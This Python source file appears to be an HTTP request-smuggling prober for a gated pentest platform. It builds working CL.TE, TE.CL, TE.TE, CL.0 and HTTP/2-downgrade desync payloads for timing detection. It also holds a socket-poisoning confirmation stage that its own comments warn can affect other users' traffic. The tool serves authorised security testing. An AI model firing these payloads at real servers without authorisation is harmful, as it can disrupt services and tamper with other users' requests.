#!/usr/bin/env python3
"""smuggle-probe — the in-repo HTTP request-smuggling / desync prober the :smuggle job invokes.

*** WHY THIS IS A BAKED IN-REPO CLIENT, NOT smuggler.py ON THE ARGV. ***
The :smuggle job runs ONE approve-each tool pass, `docker exec -i <sandbox> smuggle-probe
--job-stdin`, with the whole request template + the chosen mutation set delivered as JSON on
STDIN — no request byte reaches a shell (the intruder/race rule). defparam's smuggler.py and
assetnote's h2csmuggler are the standard external tools and are installed alongside this for
manual use in :kali / :terminal; this client exists so the GATED job has a headless engine with a
stable JSON contract the backend can parse into per-mutation verdicts, exactly as race-singlepacket
gives :race a headless synchronized client.

TWO STAGES, matching the spec:

  * ``--stage detect`` — the DEFAULT and the SAFE path. TIMING-DIFFERENTIAL detection: for each
    mutation we send a request whose ambiguous framing (a CL/TE disagreement, a duplicate
    Content-Length, an obfuscated Transfer-Encoding) makes ONE parser wait for bytes that never
    come. If a front-end/back-end pair disagree, the back-end blocks and the probe hangs until the
    read timeout — a large ``delta_ms`` over a normal baseline. A single RFC-consistent server
    answers or errors immediately (small delta). **No other user's request is ever touched** — the
    probe is entirely self-contained.
  * ``--stage confirm`` — the SEPARATE, explicitly-approved path. Socket-poisoning confirmation:
    smuggle a partial request on a keep-alive connection, then send a normal request on the SAME
    connection and see whether it returns the poisoned response (an unrecognised method like
    ``GPOST``, a 4xx, or two responses to one request). *** THIS ONE CAN AFFECT CO-TENANT
    TRAFFIC *** on the shared connection pool — which is why the backend gates it as its own
    approve-each with a co-tenant warning.

CONTRACT (both stages), so a hermetic backend test and the install proof agree with the code:

  in  (stdin JSON):
      {"url","method","headers":[[name,value],...],"body","mutations":[...],
       "stage":"detect"|"confirm","timeout":<seconds>,"insecure":<bool>}
  out (stdout JSON, one object):
      detect : {"stage":"detect","verdicts":[{"mutation","baseline_ms","probe_ms","delta_ms",
                 "error"}...],"error":""}
      confirm: {"stage":"confirm","confirms":[{"mutation","poisoned":<bool>,"status","evidence",
                 "error"}...],"error":""}

The engine NEVER decides susceptibility — it only times and observes. The threshold that turns a
timing set into a per-mutation verdict lives in the backend (`smuggle.SUSCEPTIBLE_DELTA_MS`), so
there is one place it can be tuned and one place a test pins it.

h1 mutations (CL.TE, TE.CL, CL.CL, TE.TE, CL.0) are pure stdlib raw sockets. The H2 downgrade
variants (H2.CL, H2.TE, H2.0) need the `h2` framing library and a target that negotiates HTTP/2
over ALPN; when either is absent the verdict is an HONEST inconclusive note rather than fabricated
timing (the spec's "stub H2 and say so" fallback, made a runtime property instead of a build one).
"""
from __future__ import annotations

import json
import socket
import ssl
import sys
import time
from typing import Any
from urllib.parse import urlparse

#: Per-probe read ceiling. A susceptible back-end blocks on a partial body; we do not wait the
#: whole job timeout for it — a few seconds past a normal baseline is already an unmistakable
#: delta, and a tight ceiling keeps a full mutation sweep fast.
PROBE_READ_TIMEOUT = 6.0
#: Connect timeout — a dead host should fail fast, not eat the read budget.
CONNECT_TIMEOUT = 5.0

#: The h1 mutations this engine builds a raw request for. H2.* are handled separately.
H1_MUTATIONS = ("CL.TE", "TE.CL", "CL.CL", "TE.TE", "CL.0")
H2_MUTATIONS = ("H2.CL", "H2.TE", "H2.0")


# --------------------------------------------------------------------------- #
# raw h1 request construction — one template per mutation
# --------------------------------------------------------------------------- #
def _host_header(host: str, port: int, tls: bool) -> str:
    default = 443 if tls else 80
    return host if port == default else f"{host}:{port}"


def _extra_header_lines(headers: list[list[str]]) -> str:
    """Operator headers, minus the ones each mutation sets itself (Host/CL/TE/Connection)."""
    skip = {"host", "content-length", "transfer-encoding", "connection"}
    out = []
    for pair in headers or []:
        if not isinstance(pair, (list, tuple)) or len(pair) < 2:
            continue
        name = str(pair[0] or "").strip()
        if name and name.lower() not in skip:
            out.append(f"{name}: {pair[1]}\r\n")
    return "".join(out)


def _baseline_request(host: str, port: int, tls: bool, method: str, path: str,
                      headers: list[list[str]], body: str) -> bytes:
    """A normal, RFC-consistent request — the timing reference every mutation is compared to."""
    hostline = _host_header(host, port, tls)
    extra = _extra_header_lines(headers)
    body_bytes = (body or "").encode("utf-8", "replace")
    req = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {hostline}\r\n"
        f"{extra}"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8", "replace") + body_bytes
    return req


def _probe_request(mutation: str, host: str, port: int, tls: bool, method: str, path: str,
                   headers: list[list[str]]) -> bytes:
    """The ambiguous request for one h1 mutation. Each is engineered so that IF the front-end and
    back-end disagree on where the body ends, one of them blocks waiting for bytes that never come.
    The method is forced to POST — a body-bearing method is what makes framing ambiguity matter."""
    hostline = _host_header(host, port, tls)
    extra = _extra_header_lines(headers)

    if mutation == "CL.TE":
        # Front CL=4 forwards "1\r\nA"; back-end (chunked) reads chunk 1="A" then blocks awaiting
        # the next chunk-size line that never arrives.
        return (
            f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
            f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"1\r\nA\r\nX"
        ).encode("utf-8", "replace")

    if mutation == "TE.CL":
        # Front (chunked) sees the 0-terminator and ends; back-end (CL=6) blocks awaiting more body.
        return (
            f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
            f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\nX"
        ).encode("utf-8", "replace")

    if mutation == "CL.CL":
        # Two Content-Length values (RFC: reject). If one tier honours 6 and the other 5, one
        # blocks awaiting the sixth byte.
        return (
            f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
            f"Content-Length: 6\r\nContent-Length: 5\r\n\r\n"
            f"XXXXX"
        ).encode("utf-8", "replace")

    if mutation == "TE.TE":
        # A second, obfuscated Transfer-Encoding one tier ignores and the other honours — the
        # classic desync-behind-a-normalising-proxy signal. Body is the CL.TE body.
        return (
            f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
            f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
            f"Transfer-encoding: cow\r\n\r\n"
            f"1\r\nA\r\nX"
        ).encode("utf-8", "replace")

    if mutation == "CL.0":
        # Front honours Content-Length; a back-end that treats this route as CL:0 starts parsing the
        # body as a NEW request and blocks on that request's incomplete headers. Best-effort timing
        # signal (CL.0 is often confirmed by differential rather than timing) — noted as such.
        smuggled = "GET /robots.txt HTTP/1.1\r\nX-Wait: "
        body = smuggled.encode("utf-8", "replace")
        return (
            f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
            f"Content-Length: {len(body) + 20}\r\n\r\n"
        ).encode("utf-8", "replace") + body

    raise ValueError(f"no h1 template for {mutation!r}")


def _confirm_request(host: str, port: int, tls: bool, path: str,
                     headers: list[list[str]]) -> bytes:
    """A CL.TE socket-poisoning payload: the smuggled prefix 'G' turns the NEXT request on the
    connection into 'GPOST', which a healthy server rejects with an unrecognised-method error. Sent
    on a keep-alive connection so the follow-up rides the same (potentially poisoned) socket."""
    hostline = _host_header(host, port, tls)
    extra = _extra_header_lines(headers)
    return (
        f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n{extra}"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"0\r\n\r\nG"
    ).encode("utf-8", "replace")


def _normal_followup(host: str, port: int, tls: bool, path: str) -> bytes:
    hostline = _host_header(host, port, tls)
    return (
        f"POST {path} HTTP/1.1\r\nHost: {hostline}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 5\r\nConnection: close\r\n\r\nx=1\r\n"
    ).encode("utf-8", "replace")


# --------------------------------------------------------------------------- #
# socket plumbing
# --------------------------------------------------------------------------- #
def _open(host: str, port: int, tls: bool, insecure: bool, alpn: list[str] | None = None):
    raw = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    if not tls:
        return raw
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    if alpn:
        try:
            ctx.set_alpn_protocols(alpn)
        except NotImplementedError:  # pragma: no cover - ancient openssl
            pass
    return ctx.wrap_socket(raw, server_hostname=host)


def _time_request(host: str, port: int, tls: bool, insecure: bool, payload: bytes,
                  read_timeout: float) -> tuple[float, str]:
    """Send ``payload``, read until response/close/timeout, return (elapsed_ms, error). Never raises.

    A susceptible desync makes the peer block on a partial body — the read then runs to the timeout,
    which is exactly the delay the detection reads as signal. So a timeout here is NOT an error: it
    is the measurement, and the elapsed time is returned normally with an empty error string."""
    start = time.monotonic()
    try:
        conn = _open(host, port, tls, insecure)
    except Exception as exc:  # noqa: BLE001
        return (time.monotonic() - start) * 1000.0, f"connect failed: {exc}"[:200]
    try:
        conn.settimeout(read_timeout)
        conn.sendall(payload)
        while True:
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                break  # the peer is still waiting for bytes — this IS the desync delay
            except Exception:  # noqa: BLE001
                break
            if not chunk:
                break
        return (time.monotonic() - start) * 1000.0, ""
    finally:
        try:
            conn.close()
        except Exception:  # noqa: BLE001
            pass


def _first_line(raw: bytes) -> str:
    try:
        return raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")[:200]
    except Exception:  # noqa: BLE001
        return ""


def _status_of(raw: bytes) -> int | None:
    line = _first_line(raw)
    parts = line.split(" ")
    if len(parts) >= 2 and parts[0].startswith("HTTP/"):
        try:
            return int(parts[1])
        except ValueError:
            return None
    return None


# --------------------------------------------------------------------------- #
# detect
# --------------------------------------------------------------------------- #
def _detect(spec: dict[str, Any]) -> dict[str, Any]:
    url = str(spec.get("url") or "")
    p = urlparse(url)
    tls = p.scheme == "https"
    host = p.hostname or ""
    port = p.port or (443 if tls else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    method = str(spec.get("method") or "POST").upper()
    headers = spec.get("headers") or []
    body = str(spec.get("body") or "")
    insecure = bool(spec.get("insecure"))
    mutations = [str(m).upper() for m in (spec.get("mutations") or [])]
    read_to = min(float(spec.get("timeout") or PROBE_READ_TIMEOUT), PROBE_READ_TIMEOUT)

    # One baseline for the whole sweep — a normal request's round trip.
    base_ms, base_err = _time_request(
        host, port, tls, insecure,
        _baseline_request(host, port, tls, method, path, headers, body), read_to,
    )

    verdicts: list[dict[str, Any]] = []
    for mut in mutations:
        if mut in H1_MUTATIONS:
            try:
                payload = _probe_request(mut, host, port, tls, method, path, headers)
            except ValueError as exc:
                verdicts.append({"mutation": mut, "baseline_ms": round(base_ms),
                                 "probe_ms": 0, "delta_ms": 0, "error": str(exc)})
                continue
            probe_ms, err = _time_request(host, port, tls, insecure, payload, read_to)
            verdicts.append({
                "mutation": mut, "baseline_ms": round(base_ms), "probe_ms": round(probe_ms),
                "delta_ms": round(probe_ms - base_ms),
                "error": (err if "connect failed" in err else ""),
            })
        elif mut in H2_MUTATIONS:
            verdicts.append(_detect_h2(mut, host, port, tls, insecure, path, headers,
                                       base_ms, read_to))
        else:
            verdicts.append({"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": 0,
                             "delta_ms": 0, "error": f"unknown mutation {mut!r}"})
    return {"stage": "detect", "verdicts": verdicts, "error": base_err if base_err else ""}


def _detect_h2(mut: str, host: str, port: int, tls: bool, insecure: bool, path: str,
               headers: list[list[str]], base_ms: float, read_to: float) -> dict[str, Any]:
    """Best-effort H2-downgrade timing. Needs the h2 library AND a target that negotiates HTTP/2
    over ALPN; when either is missing the verdict is an honest inconclusive note (the spec's
    'stub H2 and say so' fallback), never fabricated timing."""
    try:
        import h2.connection  # noqa: PLC0415
        import h2.config  # noqa: PLC0415
    except Exception:  # noqa: BLE001
        return {"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": 0, "delta_ms": 0,
                "error": "inconclusive — h2 framing library unavailable in this sandbox"}
    if not tls:
        return {"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": 0, "delta_ms": 0,
                "error": "inconclusive — H2 downgrade probing needs https (ALPN h2)"}
    start = time.monotonic()
    try:
        conn = _open(host, port, tls, insecure, alpn=["h2", "http/1.1"])
    except Exception as exc:  # noqa: BLE001
        return {"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": 0, "delta_ms": 0,
                "error": f"inconclusive — TLS connect failed: {exc}"[:200]}
    try:
        if getattr(conn, "selected_alpn_protocol", lambda: None)() != "h2":
            return {"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": 0, "delta_ms": 0,
                    "error": "inconclusive — target did not negotiate HTTP/2 over ALPN"}
        c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
        c.initiate_connection()
        conn.sendall(c.data_to_send())
        # Conflicting body-length signalling for the downgrade: H2.CL/H2.TE send a request-header
        # length signal the HTTP/1 back-end will disagree with after downgrade; H2.0 sends a body
        # with a zero content-length. All are best-effort — the point is a measurable hang.
        hdrs = [(":method", "POST"), (":path", path), (":scheme", "https"),
                (":authority", _host_header(host, port, tls))]
        for pair in headers or []:
            if isinstance(pair, (list, tuple)) and len(pair) >= 2:
                nm = str(pair[0] or "").strip().lower()
                if nm and nm not in (":method", ":path", ":scheme", ":authority", "host"):
                    hdrs.append((nm, str(pair[1])))
        if mut == "H2.CL":
            hdrs.append(("content-length", "0"))
        elif mut == "H2.TE":
            hdrs.append(("transfer-encoding", "chunked"))
        elif mut == "H2.0":
            hdrs.append(("content-length", "0"))
        sid = c.get_next_available_stream_id()
        # end_stream False for CL/TE (promise a body we never send -> downgrade back-end may wait);
        # for H2.0 end the stream so a body-expecting downgrade hangs.
        c.send_headers(sid, hdrs, end_stream=(mut == "H2.0"))
        if mut != "H2.0":
            c.send_data(sid, b"A", end_stream=False)
        conn.sendall(c.data_to_send())
        conn.settimeout(read_to)
        while True:
            try:
                data = conn.recv(4096)
            except socket.timeout:
                break
            except Exception:  # noqa: BLE001
                break
            if not data:
                break
            try:
                c.receive_data(data)
            except Exception:  # noqa: BLE001
                break
        probe_ms = (time.monotonic() - start) * 1000.0
        return {"mutation": mut, "baseline_ms": round(base_ms), "probe_ms": round(probe_ms),
                "delta_ms": round(probe_ms - base_ms), "error": ""}
    finally:
        try:
            conn.close()
        except Exception:  # noqa: BLE001
            pass


# --------------------------------------------------------------------------- #
# confirm — socket poisoning (CAN AFFECT CO-TENANT TRAFFIC)
# --------------------------------------------------------------------------- #
def _confirm(spec: dict[str, Any]) -> dict[str, Any]:
    url = str(spec.get("url") or "")
    p = urlparse(url)
    tls = p.scheme == "https"
    host = p.hostname or ""
    port = p.port or (443 if tls else 80)
    path = p.path or "/"
    headers = spec.get("headers") or []
    insecure = bool(spec.get("insecure"))
    read_to = min(float(spec.get("timeout") or PROBE_READ_TIMEOUT), PROBE_READ_TIMEOUT)
    mutations = [str(m).upper() for m in (spec.get("mutations") or [])]

    confirms: list[dict[str, Any]] = []
    for mut in mutations:
        confirms.append(_confirm_one(mut, host, port, tls, insecure, path, headers, read_to))
    return {"stage": "confirm", "confirms": confirms, "error": ""}


def _confirm_one(mut: str, host: str, port: int, tls: bool, insecure: bool, path: str,
                 headers: list[list[str]], read_to: float) -> dict[str, Any]:
    try:
        conn = _open(host, port, tls, insecure)
    except Exception as exc:  # noqa: BLE001
        return {"mutation": mut, "poisoned": False, "status": None,
                "evidence": "", "error": f"connect failed: {exc}"[:200]}
    try:
        conn.settimeout(read_to)
        # 1) the smuggle payload, then 2) a normal request on the SAME connection.
        conn.sendall(_confirm_request(host, port, tls, path, headers))
        try:
            conn.sendall(_normal_followup(host, port, tls, path))
        except Exception:  # noqa: BLE001
            pass
        buf = b""
        while len(buf) < 65536:
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                break
            except Exception:  # noqa: BLE001
                break
            if not chunk:
                break
            buf += chunk
        status = _status_of(buf)
        line = _first_line(buf)
        # Poisoned when the follow-up (or the connection) shows the smuggled 'G' prefix having
        # merged into the next request: an unrecognised method, a 4xx/5xx the normal request would
        # not earn, or two response lines to one follow-up.
        upper = buf.upper()
        two_responses = upper.count(b"HTTP/1.1 ") + upper.count(b"HTTP/1.0 ") >= 2
        method_anomaly = b"GPOST" in upper or b"UNKNOWN METHOD" in upper or b"NOT IMPLEMENTED" in upper
        poisoned = bool(method_anomaly or two_responses or (status is not None and status in (400, 405, 501)))
        evidence = ""
        if poisoned:
            evidence = ("smuggled prefix altered the follow-up: " + line) if line else \
                       "follow-up response desynchronised on the shared connection"
        return {"mutation": mut, "poisoned": poisoned, "status": status,
                "evidence": evidence[:300], "error": ""}
    finally:
        try:
            conn.close()
        except Exception:  # noqa: BLE001
            pass


# --------------------------------------------------------------------------- #
# entrypoint
# --------------------------------------------------------------------------- #
def _selftest() -> int:
    # Build one of every h1 template and confirm the two parsers work — proves the client imports
    # and its request builders run, which `command -v` alone cannot (build #4's lesson).
    for mut in H1_MUTATIONS:
        _probe_request(mut, "h", 80, False, "POST", "/", [])
    _baseline_request("h", 80, False, "POST", "/", [], "x")
    _confirm_request("h", 80, False, "/", [])
    _status_of(b"HTTP/1.1 405 Method Not Allowed\r\n\r\n")
    print("smuggle-probe ok")
    return 0


def main(argv: list[str]) -> int:
    if "--selftest" in argv:
        return _selftest()
    if "--job-stdin" in argv:
        try:
            spec = json.loads(sys.stdin.read() or "{}")
        except (ValueError, TypeError) as exc:
            print(json.dumps({"error": f"bad job JSON: {exc}"}))
            return 0
        stage = str(spec.get("stage") or "detect").lower()
        try:
            out = _confirm(spec) if stage == "confirm" else _detect(spec)
        except Exception as exc:  # noqa: BLE001 - a probe must never crash the contract
            out = {"stage": stage, "error": f"engine error: {exc}"[:300],
                   "verdicts": [], "confirms": []}
        print(json.dumps(out))
        return 0
    sys.stderr.write("usage: smuggle-probe [--selftest | --job-stdin]\n")
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
